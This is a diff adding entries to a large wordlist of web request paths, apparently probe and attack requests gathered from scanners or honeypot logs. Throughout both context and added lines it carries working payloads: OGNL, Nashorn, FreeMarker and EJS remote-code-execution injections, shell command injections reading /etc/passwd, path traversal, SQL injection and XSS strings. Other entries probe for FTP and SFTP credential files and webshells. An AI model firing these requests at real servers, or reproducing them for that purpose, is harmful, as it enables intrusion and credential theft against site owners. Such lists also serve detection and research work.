@@ -17,8 +17,10 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 %24%7Bnew+javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new+java.lang.ProcessBuilder%28%29.command%28%27id%27%29.start%28%29%22%29%7D%2F
 %252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
 %252E%252E/manager/html
+%255C%255Cexample.com/%25252e%25252e%25252f
 %3f/
 %40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D//
+%5C%5Cexample.com/%252e%252e%252f
 %5ccgi-bin/get_status.cgi
 %5ccgi-bin/login.cgi
 %62%61%73%65/%70%6F%73%74%2E%70%68%70
@@ -266,6 +268,9 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 .externalToolBuilders/
 .fhp
 .filemgr-tmp
+.filezilla/sitemanager.xml
+.filezilla/sitemanager.xml.save
+.filezilla/sitemanager.xml~
 .fishsrv.pl
 .flac
 .flowconfig
@@ -274,6 +279,8 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 .forward
 .ftp-access
 .ftpconfig
+.ftpconfig.save
+.ftpconfig~
 .ftppass
 .ftpquota
 .gem
@@ -497,6 +504,8 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 .rdsTempFiles
 .remote
 .remote-sync.json
+.remote-sync.json.save
+.remote-sync.json~
 .revision
 .rhosts
 .robots.txt
@@ -607,7 +616,11 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 .vscode/
 .vscode/.env
 .vscode/ftp-sync.json
+.vscode/ftp-sync.json.save
+.vscode/ftp-sync.json~
 .vscode/sftp.json
+.vscode/sftp.json.save
+.vscode/sftp.json~
 .war
 .web
 .web.env
@@ -654,9 +667,11 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 0bef
 0iiZ
 0lnS
+0nmQ
 0oIt
 0x
 0x4148.php.call
+0xQd
 1
 1-200611214053U8.jpg
 1.
@@ -707,12 +722,14 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 1c/
 1hou.php
 1index.php
+1lNq
 1ndex.php
 1oXd
 1phpmyadmin/
 1phpmyadmin/index.php?lang=en
 1q.php
 1qdV
+1sdT
 1ts.php
 1wCr
 1wpD
@@ -744,6 +761,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 25.txt
 2Dpw
 2Gsq
+2MQ7ra48IAlErEXMOtlrDHtseFc.jsp
 2ead
 2index.php
 2mZd
@@ -755,6 +773,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 2phpmyadmin/
 2phpmyadmin/index.php?lang=en
 2phpmyadmin/scripts/setup.php
+2qKn
 2rpH
 2sTd
 2uhM
@@ -767,6 +786,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 360/static/js/iku.js
 3c625c27b4da33d3d5c12e8d02104755/js/login.js
 3dae
+3iNr
 3index.php
 3jGx
 3phpmyadmin/
@@ -788,6 +808,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 4Tjk
 4bcc
 4bqU
+4fmV
 4fnT
 4jxF
 4mqJ
@@ -813,12 +834,15 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 5giW
 5jXe
 5sEo
+5sGm
 5xZV
 5yfI
 5zEi
+5zjC
 6.php
 6/
 605.php
+6493205775247574395834.html
 666.php
 666666.php
 6Bly
@@ -827,6 +851,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 6YVx
 6ofQ
 6p6
+6vVZ
 6yTZ
 6zEh
 7.php
@@ -841,6 +866,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 7rbQ
 7veK
 7vjE
+7yCj
 8.php
 803.php
 86ad51912cd50365a9edf05ddaee1fd2/css/legacy-main.css
@@ -850,6 +876,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 8YSx
 8fNq
 8oMi
+8ojK
 8ukE
 8yjA
 9.php
@@ -866,8 +893,11 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 99vu
 9Hza
 9SyX
+9ZTu
 9aTo
 9hXc
+9ifT
+9jjP
 9kMk
 9kjN
 9lUc
@@ -915,6 +945,7 @@ $%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22
 ?dns=B64
 ?dns=MTI3LjAuMC4x
 ?dns=bG9jYWxob3N0
+?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB
 ?email=foo
 ?feed=rss2
 ?id=
@@ -1027,6 +1058,7 @@ B4lz
 B7lx
 BKmc
 BMlb
+BYIx
 Backend/config/plugin.js
 Backup/
 Backups/
@@ -1140,6 +1172,7 @@ Cpanel.php
 CsVQ
 Css/Hm.css
 Css/index.css
+Ct7n
 CuteSoft_Client/CuteEditor/Images/log.gif
 D3xm
 DATA/
@@ -1169,6 +1202,8 @@ DetailOfFavouriteList
 DetailOfLists
 DetailOfOrders
 DeviceDescription.xml
+DidL
+DjEi
 Do1y
 DoIa
 Dockerfile
@@ -1203,6 +1238,7 @@ Electron/download/windows/..%5C..%5C..%5CHttp%5Cwebroot%5Cconfig.json
 Employee
 EnUU
 Eos6
+EpcD
 Error
 Error.aspx?errorid=foo
 Etc/
@@ -1228,6 +1264,7 @@ FCKeditor24/
 FD873AC4-CF86-4FED-84EC-4BD59C6F17A7
 FE/huey/.env
 FIRST_CONFIG/.env
+FJxT
 FONTS
 FQtQ
 FTP/
@@ -1258,6 +1295,7 @@ FsCa
 FwGX
 G4tn
 G7ye
+GDpb
 GGYu
 GIeg
 GO/1.php
@@ -1267,6 +1305,7 @@ Gemfile
 Gemfile.lock
 Gemfile.lock/
 Gemfile/
+GgdK
 GhAm
 GiHd
 Gigaset/
@@ -1274,8 +1313,10 @@ Global.asax
 GponForm/diag_FORM?images/
 GponForm/diag_Form?images/
 GponForm/diag_Form?style/
+Gqp4
 GroupExpansion/
 Gruntfile.js
+Gt3n
 Guo2
 GxUI
 H9qk
@@ -1341,16 +1382,19 @@ Images/Img1/loginbg.jpg
 Images/log2.jpg
 Images/logo.png
 Import
+InaD
 Install.txt
 InstantCV/server/.env
 InterfaceCRMAX.asmx
 InterfaceCRMAX.asmx?wsdl
 IxTG
 JDfh
+JKwQ
 JOWm
 JRsM
 JS/loginstatus.js
 JSON/YAML
+JYAx
 JYkN
 JabO
 Jenkinsfile/
@@ -1363,6 +1407,7 @@ Joomla/administrator/index.php
 Js2n
 K2fz
 K6yb
+K7dw
 KEVv
 KIz89PGViACfvNpQE2eoOD5u
 KNTo
@@ -1384,6 +1429,7 @@ KzPH
 L3b.php
 L8io
 LADSS/
+LEjb
 LICENSE.txt
 LIYo
 LJmY
@@ -1402,6 +1448,8 @@ Login.aspx
 Login/index.jsp
 Lpi7
 LqLT
+LtRK
+Lv2i
 M6ax
 MAINTAINERS.txt
 MCLi.php
@@ -1453,6 +1501,7 @@ MyRentals.Web/ClientApp/.env
 MySQL
 MySQL/scripts/setup.php
 MySQLAdmin/index.php
+MySQLAdmin/scripts/setup.php
 MySQLDumper
 MySQLDumper/main.php
 MySQLManager/import.php
@@ -1460,6 +1509,7 @@ MySqlManager/import.php
 N0ui
 N2pm
 N2xd
+N4dw
 N4eu
 N4qj
 NCFindWeb?service=IPreAlertConfigService&filename=
@@ -1471,16 +1521,20 @@ NHrT
 NON_EXISTING_PATH/
 NOnR
 NOrN
+NPiU
 NRrJ
 NUwC
 NVbV
 NcWT
+NdYR
+NdiA
 New%20Folder
 New%20folder%20(2)
 NextSlot
 Nodejs-Projects/play-ground/ManageUserRoles/.env
 Nodejs-Projects/play-ground/login/.env
 Nuke.App.Ui/.env
+NyOG
 O
 O2we
 O5fs
@@ -1492,16 +1546,20 @@ OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert
 OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
 OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('xss')%3E
 OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('xss')%3E
+OBxS
 OCwT
 OHzK
+OQRk
 OSDv
 OTApp/.env
 OWA/NSPI/
 OWBt
 OWLj
+Oaz2
 Obw5
 Od7r
 OfRV
+Oj3p
 OwOG
 PEnZ
 PHPInfo.php
@@ -1535,6 +1593,9 @@ PRIVACY
 PROV/
 PSBC-1
 PSBlock
+PScV
+PTBv
+PUdT
 PXpD
 Pages/RedirectPage.aspx
 Pages/logout.aspx
@@ -1548,6 +1609,8 @@ Pc/Lang/index.html
 PchB
 Phone
 Pings.php
+Pki9
+Pnl3
 Polycoms/sip.cfg
 Portal/Portal.mwsl
 Portal0000.htm
@@ -1594,17 +1657,20 @@ QyMF
 R9nc
 RAzP
 RBSv
+RBcf
 README
 README.htm
 README.md
 README.txt
 RELEASE_NOTES.txt
 RFpU
+RJiW
 RLZd
 ROiR
 RPC2
 RVP/index10.php
 RadControls/Window/Skins/Vista/Window.css
+RdNX
 Read
 Read%20Me.txt
 Read_Me.txt
@@ -1620,7 +1686,9 @@ Res/login.html
 Resources/libraries/jQuery/
 RestAPI/ImportTechnicians
 RichWidgets/Popup_Upload.aspx
+RjOR
 RjVK
+RkYF
 RnGV
 RootCA.crt
 Rq3f
@@ -1639,6 +1707,7 @@ SPA112/
 SPA122/
 SQL
 SQL/index.php
+SQL/scripts/setup.php
 SQLite-Manager/main.php
 SQLite/SQLite-Manager/main.php
 SQLite/SQLite-manager/main.php
@@ -1695,6 +1764,7 @@ SendCart
 Serve_time_server/.env
 Server.php
 Server/
+Server/commands.txt
 Server_with_db/.env
 Service
 Session
@@ -1723,6 +1793,7 @@ System/configurationFile?auth=YWRtaW46MTEK
 System/deviceInfo
 T9sA/static/image/t-06.jpg
 TEMP/
+TGpQ
 THvK
 TIIv
 TLS
@@ -1759,6 +1830,7 @@ TpUC
 Trace.axd
 Trace.axd::$DATA
 Travel_form/.env
+Tx9X
 U3kj
 U4lh
 U5do
@@ -1787,6 +1859,7 @@ UpLoad
 Updata.php
 UpgradeWizard.aspx
 Upload
+Uq0g
 UsOF
 Use
 UserCenter/css/admin/bgimg/admin_all_bg.png
@@ -1797,6 +1870,7 @@ UuNE
 Ux5Z
 V2sa
 V7an
+VDSp
 VERSION.txt
 VFKu
 VMOk
@@ -1804,7 +1878,11 @@ VOnJ
 VOtD
 VQdR
 VRLi
+VVGj
+VVHh
+VVVZ
 VVbO
+VVjG
 Vagrantfile
 Vbn7
 VcSQ
@@ -1825,6 +1903,7 @@ WEB-INF/config.xml
 WEB-INF/database.properties
 WEB-INF/web.xml
 WFGx
+WFLt
 WGhW
 WJMo
 WP/wp-content/plugins/wp-file-manager/readme.txt
@@ -1853,26 +1932,34 @@ Wm4e
 WordPress/wp-content/plugins/wp-file-manager/readme.txt
 WuEK
 WuEL
+X1en
 X1eo
+X6wW
 XGEx
 XIRi
 XJOk
 XJUf
+XMfQ
 XRmE
 XWfH
+XX6w
 XXXXXXXXXXXXXXXXXXXXXXX/
 Xap4
+XeYF
 Xf7h
 XfNQ
 XuDK
 Y3ih
 Y4ao
 Y7Ys
+Y8ci
 Y9Ry
+Y9sX
 YKrG
 YTy6
 YWYS
 Yjd5
+YuBL
 Yw3Z
 Z3R0-C00L.php
 Z3R0-C00l.php.call?cmd=cat+*.call
@@ -2062,6 +2149,7 @@ aastra/config.all.php?
 aastra/config.all.php?x
 ab2g
 ab2h
+abNL
 abak.php
 abc.php
 abc776.php
@@ -2495,12 +2583,14 @@ admpar/.ftppass
 admrev/.ftppass
 admrev/_files/
 ads
+ads?dns=B64
 ads?dns=MTI3LjAuMC4x
 ads?dns=bG9jYWxob3N0
 ads_qu_merge/.env
 adserver
 adsystem
 adv
+adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bid;+%23&password=asdf
 adv/.env
 adv2
 adv3
@@ -2621,6 +2711,7 @@ api/.env.example
 api/.git/config
 api/.vscode/sftp.json
 api/1.0/
+api/2MQ7rbh2wIHYpaPfnicV74MKu7z
 api/4
 api/?wsdl
 api/ApiHub/fetchJinse
@@ -2653,6 +2744,7 @@ api/config/getwebsitename
 api/config/info
 api/config/proxy_servers?key=1
 api/contactWay
+api/content/
 api/content_bottom
 api/corp/mobileapp-back/v1/en/account
 api/corp/mobileapp-back/v1/pl/account/loyalty/updateAddress
@@ -2689,6 +2781,7 @@ api/im/v2/app/config
 api/im/v2/app/t
 api/index
 api/index.html
+api/index.php/v1/config/application?public=true
 api/index/config
 api/index/grailindex
 api/index/index
@@ -2718,6 +2811,7 @@ api/login/captcha
 api/login/signIn
 api/lottery/color
 api/maintenance
+api/master_login
 api/message/webInfo
 api/metrologie
 api/metrologie.php
@@ -2785,6 +2879,7 @@ api/user/info?&&callback=jsonp_1601457046411_20983
 api/user/ismustmobile
 api/user/mobilelogin
 api/user/signup/step2
+api/users
 api/v/index/queryOfficePage?officeCode=customHomeLink
 api/v0/id
 api/v1
@@ -2845,6 +2940,8 @@ api_muvin/.env
 api_source/.env
 apiapp/Ygn_Girl.CityList
 apibuild.pyc
+apiclient/ember/Login.jsp
+apiclient/index.jsp
 apigw/
 apigw/usr/rest/availability/email
 apigw/usr/rest/usr/geo/birth-cities?cityStartsWith[]=a
@@ -2859,6 +2956,7 @@ apis/apps/v1/namespaces/kube-system/daemonsets/api/v1/pods
 apis/apps/v1/namespaces/kube-system/daemonsets/apis/apps/v1/namespaces/kube-system/daemonsets/
 apis/apps/v1/namespaces/kube-system/daemonsets/pods
 apisix/admin/routes
+apisix/batch-requests
 apitotsurvey
 apk
 apk.zip
@@ -2928,6 +3026,7 @@ app/kibana
 app/languages
 app/log/
 app/logs/
+app/options.py
 app/phpunit.xml
 app/plugins/advanced-custom-fields/readme.txt
 app/plugins/classic-editor/readme.txt
@@ -3006,6 +3105,7 @@ aspwpadmin
 aspxspy.aspx
 asset_img/.env
 assets
+assets../.git/config
 assets.zip
 assets/
 assets/.env
@@ -3099,6 +3199,7 @@ auth_user_file.txt
 authenticate
 authentication/login.html
 authenticationendpoint/2ctm9gaqoqtxe6tkbszy1bc2jxc.jsp
+authenticationendpoint/2mq7rajsjaprrrch3u4pyfsxw9g.jsp
 authenticationendpoint/c4k.jsp
 authenticationendpoint/cmd.jsp
 authenticationendpoint/color.jsp
@@ -3170,7 +3271,10 @@ b2b
 b2badmin/
 b2bapi
 b2c
+b5da
+bCeS
 bDMj
+bFlI
 bL6y
 bOVV
 bR7r
@@ -3477,6 +3581,7 @@ blogs
 blotter
 blue
 blue/.env
+bm6X
 bmwstory
 bn.php
 bnb.zip
@@ -3617,6 +3722,7 @@ cash
 casino
 catalog
 catalog-portal/ui
+catalog-portal/ui/oauth/verify?deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d&error
 catalog-portal/ui/oauth/verify?error=&deviceUdid=JHsiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpKCJ3aG9hbWkiKX0=
 catalog.nsf
 category/brewery-heist
@@ -3682,12 +3788,14 @@ cgi-bin/../../../../bin/sh
 cgi-bin/.2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
 cgi-bin/.env
 cgi-bin/;whoami
+cgi-bin/admin.cgi?Cmd=ping${IFS}-c${IFS}1${IFS}127.0.0.1&Command=sysCommand
 cgi-bin/admin_console.cgi
 cgi-bin/authLogin.cgi
 cgi-bin/awstats.pl
 cgi-bin/config.exp
 cgi-bin/content.asp
 cgi-bin/diagnostics.cgi
+cgi-bin/file_transfer.cgi
 cgi-bin/gw.cgi?
 cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=1620893377014
 cgi-bin/index.cgi
@@ -3695,9 +3803,11 @@ cgi-bin/index2.asp
 cgi-bin/jarrewrite.sh
 cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1
 cgi-bin/kerbynet?
+cgi-bin/kerbynet?Action=StartSessionSubmit&PW&User='%0acat%20/etc/passwd%0a'
 cgi-bin/kerbynet?Action=StartSessionSubmit&User='%0acat%20/etc/passwd%0a'&PW=
 cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0Awhoami%0A'
 cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;whoami;%22
+cgi-bin/login
 cgi-bin/login.cgi
 cgi-bin/login.cgi?requestname=2&cmd=0
 cgi-bin/login.cgi?requestname=3&cmd=0
@@ -3734,6 +3844,7 @@ cgi-bin/test/test.cgi
 cgi-bin/timepro.cgi?tmenu=netconf&smenu=wansetup&act=save&sel=dynamic&dns_dynamic_chk=on&fdns_dynamic1=8.8.8.8&fdns_dynamic2=8.8.8.8&fdns_dynamic3=8.8.8.8&fdns_dynamic4=8.8.8.8&sdns_dynamic1=8.8.8.8&sdns_dynamic2=8.8.8.8&sdns_dynamic3=8.8.8.8&sdns_dynamic4=8.8.8.8&userid=&passwd=&mtu=1454&ip1=192&ip2=168&ip3=254&ip4=2&sm1=255&sm2=255&sm3=255&sm4=0&gw1=192&gw2=168&gw3=254&gw4=254&fdns1=&fdns2=&fdns3=&fdns4=&sdns1=&sdns2=&sdns3=&sdns4=&static_mtu=150
 cgi-bin/web_json.cgi
 cgi-bin/webctrl.cgi
+cgi-bin/weblogin.cgi?username=admin'cat+/etc/passwd
 cgi-bin/welcome
 cgi-bin/wlogin_proxy_login
 cgi.pl/
@@ -3788,6 +3899,7 @@ checkout/cart
 checktoken
 chiminey
 chiminey/.env
+chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd
 choix-enseigne
 chubb.xml
 ci.php
@@ -3831,6 +3943,7 @@ client.zip
 client/.env
 client/api/findConfigByKey?configKey=level_config
 client/api/findFreeTrade
+client/get_targets
 client/mutual-fund-app/.env
 client/src/.env
 client/static/icon/hangqingicon.png
@@ -3858,8 +3971,10 @@ clouds.zip
 clover/gui/login.jsf
 club
 cluster
+cluster-location
 cluster/cluster/
 cluster/gcstats.cgi
+cm8U
 cmd.php
 cmd/testdata/expected/dot_env/.env
 cmdasp.asp
@@ -3887,6 +4002,7 @@ cmv.php
 cn.php
 cnm.php
 co9Q
+coAJ
 code
 code.php
 code.zip
@@ -4091,6 +4207,7 @@ config/settings.local.yml
 config/settings.yml
 config/settings/production.yml
 config/user.xml
+configWizard/keyUpload.jsp
 configprops
 configs.zip
 configs/
@@ -4116,6 +4233,7 @@ configuration.php~
 configuration.zip
 configuration/
 configuration>
+configurations
 conflg.php
 confluence
 confluence/
@@ -4150,6 +4268,7 @@ container
 containers
 containers/json
 content
+content../.git/config
 content.assetsearch.json?query=*&start=0&limit=10&random=123
 content.children.json
 content.childrenlist.json
@@ -4192,6 +4311,7 @@ controle/reception-dossier
 controle/suivi
 controle/suivi-bo
 controle?
+controllers/
 controllers/config.all.php?
 controllers/config.all.php?x
 controlpanel.php
@@ -4286,6 +4406,7 @@ cscpLoginWeb/scripts/public.js
 csi-requesthandler/RequestHandler
 csjs/bankCheck.js
 css
+css../.git/config
 css/.env
 css/all.css
 css/app.css
@@ -4621,6 +4742,8 @@ deploy.sh
 deploy/.env
 deployment
 deployment-config.json
+deployment-config.json.save
+deployment-config.json~
 deployment/.env
 deportes
 desk
@@ -4748,6 +4871,7 @@ dnscfg.cgi?dnsPrimary=8.8.8.8&dnsSecondary=8.8.8.8&dnsDynamic=0&dnsRefresh=1
 dnscfg.cgi?dnsPrimary=8.8.8.8&dnsSecondary=8.8.8.8&dnsDynamic=0&dnsRefresh=1&dnsIfcsList=
 dnslookup.cgi
 dnslookup.cgi?host_name=127.0.0.1;+whoami;&lookup=Lookup&ess_=true
+doAs?=`echo+CVE-2022-33891+%7C+rev`
 doLogin
 doae-production
 doc
@@ -4795,11 +4919,14 @@ dodoswap-client/.env
 doge
 doh
 doh/family-filter
+doh/family-filter?dns=B64
 doh/family-filter?dns=MTI3LjAuMC4x
 doh/family-filter?dns=bG9jYWxob3N0
 doh/secure-filter
+doh/secure-filter?dns=B64
 doh/secure-filter?dns=MTI3LjAuMC4x
 doh/secure-filter?dns=bG9jYWxob3N0
+doh?dns=B64
 doh?dns=MTI3LjAuMC4x
 doh?dns=bG9jYWxob3N0
 doku
@@ -4910,11 +5037,14 @@ dz0.php
 dz0O
 dz1.php
 e/master/images/login_r1_c1.jpg
+e0rU
 e2e
 e2e/.env
 e5Tn
 e5xJ
 e9lR
+eDHl
+eEJh
 eLBj
 eLXT
 eOCf
@@ -4924,6 +5054,7 @@ earn
 ebay
 ec
 ec/.env
+ecNG
 ecc
 ecc_agent_script_file.do
 echo.php
@@ -5121,6 +5252,7 @@ escape-rooms
 escape-rooms/
 esmacapcrm/
 esmtp/
+esp/cms_changeDeviceContext.esp?device=aaaaa:a%27"user|s."1337"
 espace-personnel/
 espace-personnel/composer.json
 espanadigital
@@ -5151,9 +5283,12 @@ evenements
 event
 eventos-deportivos
 eventos-deportivos/.env
+events../.git/config
 events4.nsf
 evox/about
+ew7J
 ex9F
+exF9
 exactarget
 exactarget/
 exam
@@ -5336,6 +5471,9 @@ fileserver
 fileserver/.env
 fileupload/
 fileupload/toolsAny
+filezilla.xml
+filezilla.xml.save
+filezilla.xml~
 film
 films
 films/.env
@@ -5431,6 +5569,7 @@ freelandadm
 freelandadm/.env
 freepbx/admin/config.php
 freepbx/recordings/index.php
+freepbx/recordings/theme/main.css
 friendGroup/list
 front
 front-app
@@ -5466,6 +5605,8 @@ ftp/.env
 ftpmaster
 ftpmaster/.env
 ftpsync.settings
+ftpsync.settings.save
+ftpsync.settings~
 ftptest.cgi
 ftptest.cgi?loginuse=&loginpas=
 fuN3
@@ -5521,6 +5662,8 @@ general
 general.php
 genericUpload
 geo
+geoserver
+geoserver/web/
 geral
 geral/.env
 gerenciador_dev/.env
@@ -5578,12 +5721,14 @@ gn4S
 go.php
 go2growApi
 go2growApi/.env
+goanywhere/lic/accept
 goautodial/
 godkey.php
 goform/formSysCmd
 goform/formWsc
 goform/webLogin
 goform/websLogin
+goip/
 gold
 golf
 goodbook.php
@@ -5772,6 +5917,7 @@ hr-file-download
 hrPlanStructure
 hs.php
 ht.access
+htP1
 htaccess
 htaccess.backup
 htaccess.bak
@@ -5819,6 +5965,7 @@ hudson/script
 hue2.php
 hunmj_serverApi/test.php
 huoshan.php
+hwL2
 hyip
 i.php
 i.tar
@@ -5826,6 +5973,7 @@ i.tar.bz2
 i.tar.gz
 i.txt
 i.zip
+i0Uo
 i2pR
 i8pK
 iCx8
@@ -5879,6 +6027,7 @@ image/checkform.js
 image/lgbg.jpg
 image_data/.env
 images
+images../.git/config
 images.php
 images/
 images/!.php
@@ -5942,6 +6091,7 @@ images/welcome.png
 images/zh-CN/logo.ico
 imagesschool/style1/flash2.jpg
 img
+img../.git/config
 img.php
 img/.env
 img/close.png
@@ -6221,6 +6371,7 @@ ionic
 ios
 ip
 ip.php
+ipAB
 ipc$
 iphone.php
 iphone/
@@ -6252,6 +6403,7 @@ jDiE
 jDu9
 jEt9
 jFTX
+jG5v
 jNl8
 jXCW
 japanese_school_website/.env
@@ -6342,6 +6494,7 @@ js/
 js/.env
 js/.env.example
 js/FCKeditor
+js/JSData.js
 js/a.script
 js/app.4f13ae0225c000632eb3.js
 js/app.5cda5727.js
@@ -6403,6 +6556,7 @@ jsp-examples/
 jsp.jsp
 jsp/debug/
 jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd
+jsp/index.jsp
 jsproxy
 jsrelay
 jsrelay/.env
@@ -6418,9 +6572,11 @@ jym-wn/
 jyyy.php
 k12/config.all.php?
 k12/config.all.php?x
+kKAf
 kKn9
 kMt1
 kS6h
+kZ2f
 kaKE
 karma
 kaspersky%20
@@ -6483,6 +6639,8 @@ l7.php
 l8.php
 l8vC
 lBAn
+lJTS
+lNk8
 lVAY
 lab
 lab/.env
@@ -6557,6 +6715,7 @@ level/15/exec/-/sh/run/CR
 liV1
 liangchen.php
 lib
+lib../.git/config
 lib/
 lib/.env
 lib/.git/config
@@ -6583,6 +6742,7 @@ lib/public.js
 lib/spaw2/dialogs/dialog.php
 lib/tiny_mce/
 lib/tinymce/
+lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 libraries
 libraries/.env
 libraries/phpmailer/
@@ -6775,6 +6935,7 @@ login.html
 login.jsp
 login.php
 login.php/'%3E%3Csvg/onload=alert%6020HyDTtekMUBe3S0bcZFBcCV94E%60%3E
+login.php?op=logout
 login.rsp
 login/
 login/.env
@@ -6786,6 +6947,7 @@ login/github
 login/google
 login/img/nyyh/chkjs.js
 login/img/nyyh/game.css
+login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}127.0.0.1)
 login/indexAction.action
 login/j_security_check
 login/kefuxian.mvc
@@ -6813,6 +6975,7 @@ logo/logo_jw.png
 logoff
 logoff.aspx
 logon
+logon.htm
 logon.php
 logon/LogonPoint/
 logon/LogonPoint/css/
@@ -6855,10 +7018,12 @@ lottery.sql
 lottery/lottery_list
 lotus
 loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+lp2N
 lp2O
 lr.php
 lrp-backend
 lrp-backend/.env
+lsH5
 lt3I
 lucee/admin/imgProcess.cfm
 luci-static/top-iot/baima_bg.jpg
@@ -6885,7 +7050,9 @@ m/java_script/template_1/game.js
 m/lotto-h5/manifest.json
 m/ticker/usdtqc
 m1Yf
+m5Ri
 m6Iq
+mDCi
 mK9k
 mNKW
 mP9f
@@ -7012,9 +7179,11 @@ med-decision
 med-decision/.env
 media
 media-admin.php
+media../.git/config
 media/
 media/.env
 media/export-criteo.xml
+media/system/js/core.js
 media/wp-includes/wlwmanifest.xml
 mediaconversion
 medias
@@ -7082,6 +7251,7 @@ micampo.perlo/.env
 micro-app-react-communication/.env
 micro-app-react/.env
 mifs/.;/services/LogService
+mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5(999999999),1,2),NULL,NULL,NULL,NULL,NULL,NULL'
 min.php
 mindex.html
 mindsweeper/gui/.env
@@ -7116,6 +7286,7 @@ mmp.php
 mnAThMHcyz.php/index/login
 mnt/mtd/Config/Account1
 mo.php
+moN2
 moadmin.php
 mobai.PHP
 mobile
@@ -7317,6 +7488,7 @@ n23.php
 n24.php
 n28356009/gxqimages/hongdao1.gif
 nJp5
+nPj4
 nQ0m
 nRUG
 nUNK
@@ -7338,6 +7510,7 @@ navpage
 navpage.do
 nb-configuration.xml
 nb.php
+nbT8
 nbZ3
 nbactions.xml
 nbproject/
@@ -7348,11 +7521,13 @@ nbproject/project.xml
 ncsi.txt
 ncufresh15
 ncufresh15/.env
+ndR9
 neko.php
 netbios/
 netcore_get.cgi
 network
 network?url=foo
+network_test.php
 never_could_exists
 new
 new-index.php
@@ -7442,6 +7617,8 @@ o
 o.php
 o/headless-delivery/v1.0/openapi.yaml
 o1o/a8.php
+o4Hr
+oFRU
 oH9l
 oI6o
 oZDP
@@ -7576,6 +7753,7 @@ owa/auth/Current/scripts/system_web/4_0_30319/OutlookIN.aspx
 owa/auth/Current/system_web/4_0_30319/OutlookIN.aspx
 owa/auth/Current/themes/resources/system_web/4_0_30319/OutlookIN.aspx
 owa/auth/Current/themes/system_web/4_0_30319/OutlookIN.aspx
+owa/auth/frowny.aspx?app=people&esrc=MasterPage&et=ServerError&refurl=}}}alert(document.domain)//&te=\
 owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
 owa/auth/logon.aspx
 owa/auth/logon.aspx?
@@ -7599,8 +7777,10 @@ p4/.env
 p4rG
 pHpMyAdMiN/scripts/setup.php
 pMA/import.php
+pMA/scripts/setup.php
 pMA2005/import.php
 pMA2006/import.php
+pZBQ
 pa7U
 package-lock.json
 package.json
@@ -7627,6 +7807,7 @@ page/home/widgets/widget_alertHistory.jsp
 page/home/widgets/widget_calendar.jsp
 page/home/widgets/widget_news.jsp
 page/home/widgets/widget_workbench.jsp
+page?id=2LY6EG3osLKT6WwulgP8k3yQwTD&settings[view%20options][outputFunctionName]=xprocess.mainModule.require(%27child_process%27).execSync(%27id%27)s
 page?name=@(7*7)
 pagefile.php
 pages
@@ -7731,6 +7912,7 @@ pesquisa/.env
 pew.php?
 pf/
